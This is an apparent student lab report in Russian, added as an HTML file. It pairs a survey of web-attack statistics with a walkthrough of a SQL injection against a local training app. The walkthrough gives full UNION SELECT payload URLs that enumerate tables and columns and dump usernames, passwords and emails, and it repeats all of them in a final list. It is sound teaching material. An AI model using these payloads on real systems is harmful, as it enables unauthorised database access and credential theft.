@@ -1,0 +1,373 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>ЛР 1</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    max-width: 820px;
+    margin: 40px auto;
+    padding: 0 20px;
+    color: #1a1a1a;
+    line-height: 1.55;
+    font-size: 16px;
+  }
+  h1 { font-size: 26px; margin-top: 0; }
+  h2 { font-size: 21px; margin-top: 36px; border-bottom: 1px solid #e5e5e5; padding-bottom: 6px; }
+  h3 { font-size: 17px; margin-top: 28px; }
+  h4 { font-size: 15px; margin-top: 22px; }
+  p { margin: 12px 0; }
+  pre {
+    background: #f5f5f5;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+    padding: 12px 14px;
+    overflow-x: auto;
+    font-size: 13.5px;
+    line-height: 1.45;
+    font-family: "SF Mono", Menlo, Consolas, monospace;
+  }
+  code {
+    background: #f0f0f0;
+    border-radius: 3px;
+    padding: 1px 5px;
+    font-size: 13.5px;
+    font-family: "SF Mono", Menlo, Consolas, monospace;
+  }
+  pre code { background: none; padding: 0; font-size: inherit; }
+  ol, ul { padding-left: 24px; }
+  li { margin: 6px 0; }
+  strong { font-weight: 600; }
+  a { color: #0645ad; }
+  img { max-width: 100%; border: 1px solid #ddd; border-radius: 4px; margin: 10px 0; }
+</style>
+</head>
+<body>
+
+<h1>ЛР 1</h1>
+
+<h2>I часть</h2>
+
+<h3>1. Источники</h3>
+
+<p><code>https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/</code></p>
+
+<p><code>https://ptsecurity.com/research/analytics/web-vulnerabilities-2020-2021/</code></p>
+
+<p><code>https://www.verizon.com/about/news/2025-data-breach-investigations-report</code></p>
+
+<p><code>https://services.google.com/fh/files/misc/m-trends-2025-en.pdf</code></p>
+
+<p><code>https://owasp.org/Top10/2025/0x00_2025-Introduction/</code></p>
+
+<p><code>https://ptsecurity.com/research/analytics/russia-cyberthreat-landscape-2026/#id2</code></p>
+
+<p><code>https://bi.zone/expertise/blog/obzor-owasp-top-10-2025/</code></p>
+
+<p><code>https://www.comnews.ru/content/244332/2026-03-20/2026-w12/1010/odnu-kompaniyu-2025-g-prishlos-bolee-900-ddos-atak</code></p>
+
+<h3>2. Доля успешных атак на организации, проведенных с помощью эксплуатации веб-уязвимостей</h3>
+
+<p>В источниках я нашел довольно разные подходы к подсчету, поэтому я не стал сравнивать в процентном соотношении, а просто использовал их как ориентир.</p>
+
+<p>По данным Positive Technologies, в I полугодии 2025 года эксплуатация уязвимостей использовалась в 31% успешных атак на организации. Это широкая метрика по всем уязвимостям, не только веб. При этом более ранние отчеты PT показывают, что веб-ресурсы компаний становились объектами атак в 17% случаев в 2021 году и уже в 22% случаев в 2022 году, а число атак с эксплуатацией веб-уязвимостей в 2022 году выросло на 67%. Эти данные не дают точную долю успешных атак именно через веб-уязвимости, но показывают, что веб-ресурсы часто подвергаются атакам.</p>
+
+<p>Для сравнения можно взять Verizon DBIR 2025. В нем говорится, что эксплуатация уязвимостей была начальным вектором примерно в 20% подтвержденных breach-инцидентов. Также отдельно отмечается рост атак на edge-устройства и VPN. Эти данные лишь подтверждают тенденцию: уязвимости во внешнем периметре часто используются для первичного доступа.</p>
+
+<p>В отчете Mandiant M-Trends 2025 тоже видно, что эксплуатация уязвимостей часто используется в начале атаки. Среди расследованных инцидентов, где удалось определить начальный вектор, на эксплойты пришлось 33%. Регионально картина различалась: EMEA - 39%, Americas - 28%, JAPAC - 64%. В отчете Mandiant доля эксплойтов сильно отличается по регионам. Особенно высокие значения указаны для JAPAC и EMEA.</p>
+
+<p>Похожую картину показывает и отчет CODE RED 2026, но я бы не сравнивал напрямую, потому что это не статистика реальных атак, а результаты пентестов. В ходе внешних тестов на проникновение специалисты PT SWARM использовали уязвимости веб-приложений в 60% попыток получения доступа во внутреннюю сеть компаний. Это уже не статистика реальных инцидентов, а результаты контролируемых проверок, но именно они хорошо показывают, насколько часто веб-приложение становится рабочей точкой входа в инфраструктуру.</p>
+
+<h3>3. Распределение по конкретным уязвимостям</h3>
+
+<p>Если брать российские данные по самим веб-приложениям, Positive Technologies в исследовании 2020-2021 гг. получила следующую картину. Во всех исследованных веб-приложениях были выявлены уязвимости класса Broken Access Control. Еще 83% приложений содержали проблемы класса Security Misconfiguration. Среди частных примеров misconfiguration исследователи отмечают отсутствие заголовка Strict-Transport-Security в 48% приложений и некорректный заголовок X-Content-Type-Options в 34% приложений.</p>
+
+<p>Для промышленного сектора PT отдельно отмечает, что в 81% веб-приложений встречались уязвимости, связанные с внедрением кода (то есть различные injection-подобные проблемы), а в 44% - уязвимости, вызванные использованием небезопасных и устаревших компонентов. Если обобщить эти данные, чаще всего встречаются проблемы с доступом, настройками безопасности, внедрением кода и устаревшими компонентами.</p>
+
+<p>Свежий отчет CODE RED 2026 дает более конкретное распределение по современным проблемам веб-приложений российских компаний. Наиболее распространенной уязвимостью стала недостаточная авторизация - 32% от всех выявленных уязвимостей, причем у 50% таких случаев риск был оценен как высокий. Также отсутствие защиты от подбора учетных данных было выявлено в 33% протестированных приложений, хранение паролей в открытом виде - в 12%, а раскрытие конфигурационной информации - в 16%.</p>
+
+<p>Если брать зарубежные incident response данные, то Mandiant в 2024 году чаще всего наблюдала эксплуатацию следующих уязвимостей: CVE-2024-3400 в PAN-OS GlobalProtect, связку CVE-2023-46805 + CVE-2024-21887 в Ivanti Connect Secure / Policy Secure, а также CVE-2023-48788 в FortiClient EMS. Интересно, что 3 из 4 наиболее часто эксплуатируемых уязвимостей в выборке Mandiant сначала использовались как zero-day.</p>
+
+<p>OWASP Top 10:2025 удобнее использовать не для конкретных CVE, а для понимания основных классов проблем. В верхней части списка находятся Broken Access Control и Security Misconfiguration. OWASP указывает среднюю incidence rate на уровне 3.74% для Broken Access Control, 3.00% для Security Misconfiguration, 3.80% для Cryptographic Failures и 3.08% для Injection. При этом в категории Injection отдельно подчеркивается, что туда входят как Cross-site Scripting (XSS) с более чем 30 тысячами CVE, так и SQL Injection с более чем 14 тысячами CVE.</p>
+
+<h3>Вывод</h3>
+
+<p>Единую точную долю атак через веб-уязвимости назвать сложно. В разных отчетах считаются разные вещи: успешные атаки, подтвержденные утечки, начальный вектор или результаты пентестов. Но общий вывод один: уязвимости веб-приложений и внешнего периметра остаются важной точкой входа.</p>
+
+<p>В российских отчетах чаще всего выделяются проблемы контроля доступа, ошибки конфигурации, инъекции, устаревшие компоненты и слабая парольная защита. Зарубежные отчеты показывают похожую картину: эксплуатация уязвимостей часто используется для первичного доступа, особенно через публично доступные сервисы, VPN и edge устройства.</p>
+
+<p>Итого веб-приложения и внешний периметр остаются удобной точкой входа для атакующих, а самые типичные проблемы связаны не только с SQL инъекциями или XSS, но и с неправильной авторизацией, настройками безопасности и устаревшими компонентами.</p>
+
+<h2>II часть</h2>
+
+<h3>Процесс работы</h3>
+
+<h3>1. Начало</h3>
+
+<p>URL: <code>http://localhost:8080/</code></p>
+
+<p>Перед началом инициалилизировали базу данных (<code>http://localhost:8080/sql-connections/setup-db.php</code>)</p>
+
+<p>URL: <code>http://localhost:8080/task</code></p>
+
+<p>На странице отображается текст:</p>
+
+<pre><code>Введите в качестве параметра ваш id</code></pre>
+
+<h3>2. Корректный запрос с id</h3>
+
+<p>URL: <code>http://localhost:8080/task?id=1</code></p>
+
+<p>Страница вывела:</p>
+
+<pre><code>Ваш id:1
+Ваш логин:admin</code></pre>
+
+<p>Следовательно, параметр id реально участвует в sql запросе и влияет на вывод.</p>
+
+<h3>3. Проверка на ошибку SQL</h3>
+
+<p>URL: <code>http://localhost:8080/task?id=1%27</code></p>
+
+<p>Сервер вернул SQL-ошибку: <code>You have an error in your SQL syntax...</code>. Значит параметр id уязвим к SQL injection.</p>
+
+<h3>4. Неудачные попытки</h3>
+
+<p>Логическое условие без закрытия кавычки</p>
+
+<p>URL: <code>http://localhost:8080/task?id=1%20AND%201=1</code></p>
+
+<p>Вывод остался тем же:</p>
+
+<pre><code>Ваш id:1
+Ваш логин:admin</code></pre>
+
+<p>Логическое условие без закрытия кавычки</p>
+
+<p>URL: <code>http://localhost:8080/task?id=1%20AND%201=2</code></p>
+
+<p>Вывод остался тем же:</p>
+
+<pre><code>Ваш id:1
+Ваш логин:admin</code></pre>
+
+<p>Инъекция не сработала, потому что значение id подставляется в SQL как строка, и нужно сначала закрыть строковую кавычку.</p>
+
+<p>Попытки ORDER BY без закрытия кавычки</p>
+
+<p>URL:</p>
+
+<pre><code>http://localhost:8080/task?id=1%20ORDER%20BY%201%23
+http://localhost:8080/task?id=1%20ORDER%20BY%202%23
+http://localhost:8080/task?id=1%20ORDER%20BY%203%23
+http://localhost:8080/task?id=1%20ORDER%20BY%204%23</code></pre>
+
+<p>Во всех случаях вывод оставался тем же:</p>
+
+<pre><code>Ваш id:1
+Ваш логин:admin</code></pre>
+
+<p>Без закрытия кавычки SQL-код не исполняется.</p>
+
+<h3>5. Успешная булева SQL-инъекция</h3>
+
+<p>Проверка истинного условия</p>
+
+<p>URL: <code>http://localhost:8080/task?id=1%27%20AND%20%271%27=%271</code></p>
+
+<p>Вывод:</p>
+
+<pre><code>Ваш id:1
+Ваш логин:admin</code></pre>
+
+<p>Проверка ложного условия</p>
+
+<p>URL: <code>http://localhost:8080/task?id=1%27%20AND%20%271%27=%272</code></p>
+
+<p>Страница вернула пустой результат. Булева SQL-инъекция работает.</p>
+
+<p>Следовательно, параметр id используется примерно в конструкции вида:</p>
+
+<pre><code>... WHERE id = &#x27;$id&#x27; LIMIT 0,1</code></pre>
+
+<h4>Определение количества столбцов</h4>
+
+<p>Были отправлены следующие запросы:</p>
+
+<p><strong>URL:</strong></p>
+
+<p><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%201%23</code></p>
+
+<p><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%202%23</code></p>
+
+<p><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%203%23</code></p>
+
+<p><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%204%23</code></p>
+
+<p><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%205%23</code></p>
+
+<p><strong>Результат:</strong></p>
+
+<ul>
+
+  <li><code>ORDER BY 1</code> - работает</li>
+
+  <li><code>ORDER BY 2</code> - работает</li>
+
+  <li><code>ORDER BY 3</code> - работает</li>
+
+  <li><code>ORDER BY 4</code> - ошибка: <code>Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</code></li>
+
+  <li><code>ORDER BY 5</code> - ошибка: <code>Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;</code></li>
+
+</ul>
+
+<p>Исходный sql запрос содержит 3 столбца</p>
+
+<h3>6. Проверка подстановки значений</h3>
+
+<p><strong>URL:</strong> <code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,2,3%23</code></p>
+
+<p>Страница вывела:</p>
+
+<ul>
+
+  <li><code>Ваш id:1</code></li>
+
+  <li><code>Ваш логин:2</code></li>
+
+</ul>
+
+<p><code>UNION SELECT</code> работает.</p>
+
+<p>На страницу выводятся 1-й и 2-й столбцы.</p>
+
+<h3>7. Получение списка таблиц</h3>
+
+<p><strong>URL:</strong> <code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23</code></p>
+
+<p><strong>Вывод:</strong> <code>Ваш логин:emails,users</code></p>
+
+<p>В базе найдены таблицы:</p>
+
+<ul>
+
+  <li><code>emails</code></li>
+
+  <li><code>users</code></li>
+
+</ul>
+
+<h3>8. Получение списка колонок</h3>
+
+<p><strong>URL:</strong> <code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(table_name,0x3a,column_name%20SEPARATOR%200x7c),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%23</code></p>
+
+<p><strong>Вывод:</strong></p>
+
+<p><code>Ваш логин:emails:id|emails:email_id|users:id|users:username|users:password</code></p>
+
+<p>Структура таблиц:</p>
+
+<ul>
+
+  <li><code>users(id, username, password)</code></li>
+
+  <li><code>emails(id, email_id)</code></li>
+
+</ul>
+
+<p>Из этого следует, что почта пользователя, вероятно, связывается с пользователем по полю <code>id</code>.</p>
+
+<h3>9. Получение всех логинов и паролей</h3>
+
+<p><strong>URL:</strong> <code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(username,0x3a,password%20SEPARATOR%200x7c),3%20FROM%20users%23</code></p>
+
+<p><strong>Результат:</strong></p>
+
+<p>Были получены пары <code>username:password</code>, в том числе: <code>Volk2:Wa spoiuuuuu</code>, это именно тот пароль, что нам нужен</p>
+
+<h4>Получение логинов и email через JOIN</h4>
+
+<p><strong>URL:</strong> <code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(users.username,0x3a,emails.email_id%20SEPARATOR%200x7c),3%20FROM%20users%20JOIN%20emails%20ON%20users.id=emails.id%23</code></p>
+
+<p><strong>Результат:</strong></p>
+
+<p>Были получены пары <code>username:email</code>, в том числе: <code>Vinni-pukh:honey_lover@otus-lab.com</code></p>
+
+<h3>10. Точечное подтверждение пароля пользователя Volk2</h3>
+
+<p><strong>URL:</strong> <code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,password,3%20FROM%20users%20WHERE%20username=0x566f6c6b32%23</code></p>
+
+<p><strong>Результат:</strong> <code>Ваш логин:Wa spoiuuuuu</code></p>
+
+<h2>Итого</h2>
+
+<ol>
+
+  <li><strong>Пароль пользователя <code>Volk2</code>:</strong></li>
+
+</ol>
+
+<p><code>Wa spoiuuuuu</code></p>
+
+<ol>
+
+  <li><strong>Почта пользователя <code>Vinni-pukh</code>:</strong></li>
+
+</ol>
+
+<p><code>honey_lover@otus-lab.com</code></p>
+
+<h2>Список всех использованных URL</h2>
+
+<pre><code>http://localhost:8080/
+
+http://localhost:8080/sql-connections/setup-db.php
+
+http://localhost:8080/task
+
+http://localhost:8080/task?id=1
+
+http://localhost:8080/task?id=1%27
+
+http://localhost:8080/task?id=1%20AND%201=1
+
+http://localhost:8080/task?id=1%20AND%201=2
+
+http://localhost:8080/task?id=1%20ORDER%20BY%201%23
+
+http://localhost:8080/task?id=1%20ORDER%20BY%202%23
+
+http://localhost:8080/task?id=1%20ORDER%20BY%203%23
+
+http://localhost:8080/task?id=1%20ORDER%20BY%204%23
+
+http://localhost:8080/task?id=1%27%20AND%20%271%27=%271
+
+http://localhost:8080/task?id=1%27%20AND%20%271%27=%272
+
+http://localhost:8080/task?id=1%27%20ORDER%20BY%201%23
+
+http://localhost:8080/task?id=1%27%20ORDER%20BY%202%23
+
+http://localhost:8080/task?id=1%27%20ORDER%20BY%203%23
+
+http://localhost:8080/task?id=1%27%20ORDER%20BY%204%23
+
+http://localhost:8080/task?id=1%27%20ORDER%20BY%205%23
+
+http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,2,3%23
+
+http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23
+
+http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(table_name,0x3a,column_name%20SEPARATOR%200x7c),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%23
+
+http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(username,0x3a,password%20SEPARATOR%200x7c),3%20FROM%20users%23
+
+http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(users.username,0x3a,emails.email_id%20SEPARATOR%200x7c),3%20FROM%20users%20JOIN%20emails%20ON%20users.id=emails.id%23
+
+http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,password,3%20FROM%20users%20WHERE%20username=0x566f6c6b32%23</code></pre>
+
+</body>
+</html>
